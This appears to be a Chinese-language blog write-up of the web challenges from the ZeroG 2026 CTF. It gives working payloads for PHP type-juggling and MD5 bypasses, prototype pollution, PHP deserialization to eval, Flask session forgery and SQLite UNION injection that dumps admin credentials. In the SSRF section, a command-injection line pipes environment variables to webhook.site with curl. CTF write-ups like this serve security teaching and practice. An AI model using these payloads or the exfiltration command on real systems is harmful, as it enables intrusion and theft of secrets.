---
title: ZeroG-零重力 CTF 2026（WEB）
url: https://mp.weixin.qq.com/s/NLMoOxjh4G138yMO4EV1DA
source: Doonsec's feed
date: 2026-10-30
fetch_date: 2026-10-31T07:44:55.756347
---

# ZeroG-零重力 CTF 2026（WEB）

# ZeroG-零重力 CTF 2026（WEB）

原创

opis
opis

玄网安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# WEB—米米的奇幻之旅

```
第一关 · 数字=字符串的魔法
米米来到神秘森林入口。
石碑上写着：

if($_GET['step1']=='2026'){
    echo '第一关通过';
}
提示：PHP里的 == 有特殊魔法哦～

第二关 · 穿越消失的文字
米米发现：

$key=$_GET['step2'];
$key=str_replace('flag','',$key);
if($key==='flag'){
    success;
}

str_replace 只对原字符串做一次扫描替换，双写绕过
```

`/?step1=2026&step2=fflaglag`

```
第三关 · 来自本机的访客
门卫喵说：

只有来自127.0.0.1的人才能进入。

米米：服务器真的知道你的真实IP吗？
```

`X-Forwarded-For`

```
第四关 · 管理员身份卡
系统检测你的身份：

普通游客 ?

if($_COOKIE['admin']=='1'){
    success;
}
cookie:admin=1
```

```
第五关 · 来自东方的语言
米米系统只接待来自喵星的访客。

普通访客只能看到一片迷雾，只有带着正确语言标记的人，才能听懂米米的回应：miao

Accept-Language: miao
```

```
第六关 · 最终Boss喵
Boss说：

$pwd=$_GET["pwd"];
if($pwd==0 && strlen($pwd)>0){
    flag
}

字符串绕过 0e0
```

# WEB-你胆子真是肥嘟嘟的

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5doJUxhwMKEDiaVuqxPJEtwVBCT3ia7GFNMFDCLkWicq0qzEvqYLPd8UQ9L0VqNvsawR9VicSyswn4rmv42ZgRDdywPLcxgdkZBCIE/640?wx_fmt=webp&from=appmsg)`$user->__class__->is_admin === true`

“类级策略” + “递归整理/逐层整理” = 服务端把用户提交的 JSON 做递归深合并

`{"__proto__":{"is_admin":true}}`![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5fZGbhpk16W2WobLxF0xhMsRvN0reptVq7ywMh8ueOUhokPtSQXP3JB6nUQ2fVOJR6hIKWhOnFIibD0BJHT3UrsxCibbQcKWjcjY/640?wx_fmt=webp&from=appmsg)

# WEB-ZeroG\_2026

```
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);

highlight_file(__FILE__);
include_once('flag.php');

if(isset($_GET['zero']) && preg_match('/^ZeroG 2026!$/', $_GET['zero']) && $_GET['zero'] !== 'ZeroG 2026!') {
    echo "Welcome to ZeroG 2026 challenge & Step 1 passed!<br>";

    if (intval($_GET['xp']) < 2026 && intval($_GET['xp'] + 4) > 2030) {
        echo "Step 2 passed!<br>";

        if (isset($_POST['Welcome__ctf.2026']) && isset($_POST['mm'])) {
            $a = $_POST['Welcome__ctf.2026'];
            $b = $_POST['mm'];
            if ($a !== $b && md5($a) == md5($b)) {
                echo "Step 3 passed!<br>";
                $code=$_POST['code'];
                eval($code);
            } else {
                echo "MD5 collision? Not enough!<br>";
            }
        } else {
             echo "Missing parameters!<br>";
        }
    } else {
        echo "intval? Try again!<br>";
    }
} else {
    echo "First step failed!<br>";
}

?>
First step failed!
```

`1:PHP 用的 PCRE 里，$ 不只匹配字符串末尾[payload：ZeroG 2026!%0A]`

`2:进制转换[payload:xp=0x3752]`

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5e8eJdjuOAa13FTgfpC54O6dgj05wlNVVMTSwCKRtXgfq46PGT2z2ZTyL3W0CCyyuKsyGicaMcqjpKEGjcxO6ibicCUufRr8XwDYQ/640?wx_fmt=webp&from=appmsg)`3:源码要的键是 $_POST['Welcome__ctf.2026']，中间是真正的点。但 PHP 注册 POST 变量时，会把名字里的 . 和空格改成 _，而且只改到第一个 [ 为止[Welcome[_ctf.2026]`

`为什么改为[，这就是PHP 7.x 中一个比较经典的 CTF 知识点：PHP 将 GET 参数名中的方括号 [转换为下划线 _的历史兼容行为`

`4:MD5碰撞就行：`

```
md5("QNKCDZO")   = 0e830400451993494058024219903391
md5("240610708") = 0e462097431906509019562988736854
```

`[Welcome[_ctf.2026=QNKCDZO&mm=240610708&code=system("cat /flag");]`

# WEB-MagicInvoker

`PHP反序列`

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5cr0fArakpgxeTHLCZgfvc1kSmrrGg28nm2LSFAFBia46DCSfq9ywibhA7xl4sPFlVdcn1uo75kfogIjBeOd3oOIamklJ5fG4YhU/640?wx_fmt=webp&from=appmsg)

```
四个类里只有 Invoker 能直接形成利用：

class Invoker {
    public $code;
    public function __destruct() {
        eval($this->code);
    }
}
```

```
<?php
class Invoker {
    public $code;
}

$o = new Invoker();
$o->code = "echo `ls`;";

echo serialize($o), PHP_EOL;
```

`flag在变量环境中`

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5eSpicsBaN8opMnClFfh8Wz2ovWHaJiczNRfns1ibXMjkqnkqa78kicoA9xMhXJNzdMfupXzjbPSKkpNqPbey1ib5csL0JMUPibic1hnA/640?wx_fmt=webp&from=appmsg)

# WEB-Can't see the result? Just take

`SSRF`

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5d5AiaWRQXDpwoWxCTBvPNIwLfJapzpd5rp1GEvwWfS48Np8O9LVmIflQPR8oVLY5Ym4wdXmTUkCvMNlRPUpWkSHoSEgiahXOoGg/640?wx_fmt=webp&from=appmsg)`暴露内容接口：http://127.0.0.1:5001`发现有黑名单

`0x7f000001 是 127.0.0.1 的十六进制写法`

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5faehgXJAkth6Keeb4EdbF1jEN3K2hKiaAmdz8RS6icT0ZVOHRZ6qNVrJgTlYF92L0Knr6ibibOE0hRciaoNLmeS19ibWguJErZ0YUoo/640?wx_fmt=webp&from=appmsg)`不会放回内容：提示什么邮箱？？？`

提示1：

`可手动添加注入命令分隔符以确保解析准确`在/api/debug?cmd=whoami 执行别的命令没用

`把返回的内容外带；用 webhook.site 收数据`

```
/compare?url=http://0x7f000001:5001/api/debug?cmd=;curl https://webhook.site/<token>/fromsemi
```

payload：;printenv | curl -s --data-binary @- https://webhook.site//loot

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5e7avibrWBygeYxpialEQ9IkAIdjALhvcmI7wndgiccZUvF4Zzx7qF4AMZseibc8uVxZtP0EgabNmqKNwBvdiawKcibrib6bV3GuXK3KE/640?wx_fmt=webp&from=appmsg)

# WEB-FlaskLogin

提示：初始账号为guest:guest123，如何让站点认为你是管理员呢？

提示2：（F12 → Application → Cookies，那个 session cookie 引起了我的注意）

`eyJ1c2VyIjoiZ3Vlc3QifQ.auBcCQ.4anK0P_NF3nqw6mI7yjYBv9JYf4`考点 flask session解密

`Flask 用 SECRET_KEY 对 cookie 签名。`所以需要爆破key：ctf2026

```
from flask_unsign import sign
import urllib.request

cookie = sign({"user": "admin"}, "ctf2026")
req = urllib.request.Request(
    "http://5001-f790fb86-6648-491b-a478-dc48330aabfe.challenge.ctfplus.cn/",
    headers={"Cookie": "session=" + cookie},
)
print(urllib.request.urlopen(req).read().decode())
```

`eyJ1c2VyIjoiYWRtaW4ifQ.auBdBw.44VVQEN8Qs3qSE2wr4jg0faA7Rk`

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5fFTGUicTRVOAJJmHsHDPS3OAbYs0lQBnx890u4WBkzb04yIGweABhQFURZ168dTQTBN6TeSCeAGFJia6okDEHkYU7FUZiaxjmdvI/640?wx_fmt=webp&from=appmsg)

# WEB-Orbital Suply

`考点：ssti`
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5c9XZTfqpBrxj6BcboCL8Bicic33S2ic4icIYKiaEvCHO3WyLLG5n9pTjpCPJPoEFicNDxgRgD6hIULghymjibB8CYOLEwQ2SgNq7w11U/640?wx_fmt=webp&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5fPwhRpVPb1v7bNdYPIicFh9nje6qxKW1mPPBI2fsibEyoLedVokGz4dofm70icS5jvqV4PnicAepauOeqH0HaRMnTfticFvdPParLo/640?wx_fmt=webp&from=appmsg)

# WEB-云栈商城

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5dbyKHQVicWAZgnNDTggdpwM4by1dJ1gjBZoKWYW8Eg7libQViaMZVkeRn29vVJHOn5I3YqGYRzdHyicM9nBia9SQHIgLicvQPPZbhLw/640?wx_fmt=webp&from=appmsg)`看到json，想到伪造admin`

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5fuiaWfqRMlVSK2wa6UbEwSE2vmNImHYZsS3dQAV9ibfn30ic5MvTgnZvonjNL9HFZPz1dRKQgqCKuVQpSqAeLzmyic0a1MO8ic5v0c/640?wx_fmt=webp&from=appmsg)`通过简单的修改为 admin没用`

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5ftGr5Qwux2klUBuePKtVKAzvrHsj8nPqwtr2LfuYeSyNZd6XibTCd7quGUxknK8t4VbFUiavmeIqyMV0VMQsWQSBGkibFWGtxP5s/640?wx_fmt=webp&from=appmsg)`重点：看到用户信息是通过数据库反馈的，那么测试能不能sql`

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5dreHJTEP7Fy3MujGL0LOhrzEllbfbWUc0QZBk35EWegyKn7wMOqibiaRt0HXiavnb5IjKRXcJEYFZW4FLPdOfMwiarb6emmdWONbY/640?wx_fmt=webp&from=appmsg)`我在用户和密码，都写写入sql语句看反馈`

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5eTh62ZQu0KHIpjIDwJ7WI0F0BM53cgCqvJeicRcyf3KomliadurGibDEs9dJbakPBhyf7f6kD2S7bsk4bgvuiaNDJk3Wb6Pfich3Ik/640?wx_fmt=webp&from=appmsg)`改为guest' AND '1'='2 测试`

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5e0dkO57pYV7E3zRNmMNXuqETy0xLDJyRLDhAzfs2cbYEZBlry5iaTDJDOj256sGH1005Aib9OYp08PoUib7VSBbicb32Pe5NYrMc0/640?wx_fmt=webp&from=appmsg)`发现：接口放回无用户，说明sql语句成立`在测试information\_schema.tables 直接 500，可以想到是 SQLite数据库

提示：SQLite 把所有表记在系统表 sqlite\_master 里，name 是表名，sql 是建表语句

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5ePMIiaQribwTqibo6yWEv7n6xwGeImN8ppib5ZaibT9Pia9ASiavl7tZaOBvzDtcTofIgOFCEjLknZXm1v9TldxEEujaTOd3bicBanKJk/640?wx_fmt=webp&from=appmsg)`在payload中：要把guest改为任意值`

```
  ' UNION SELECT group_concat(sql, char(10)),2,3,4 FROM sqlite_master WHERE type='table'--
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5esVGHqOq5UutDibwIPBicd9s4DxYPCUcfTqOnWyQBnZyyjdkmXEgL8A1uZgPbWrg99r7gxQDBic8nU3OFQTVQKnzFr3NfdUibFxw8/640?wx_fmt=webp&from=appmsg)admin\_users 的定义是 id, username, password, role, real\_name, last\_login, created\_at。列名有了才能 SELECT。

```
' UNION SELECT group_concat(username||'|'||password||'|'||role||'|'||ifnull(real_name,''),' ;; '),2,3,4 FROM admin_users--
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5dSCVMLBiamE7G4aRSaEpjgFNczXiaAnd9XRXCdlPNYDIeVfjLTdnYDuJC21B6TavPqmnee1our5ZwFD2RNVaRic2XOm9DSwAEIN0/6...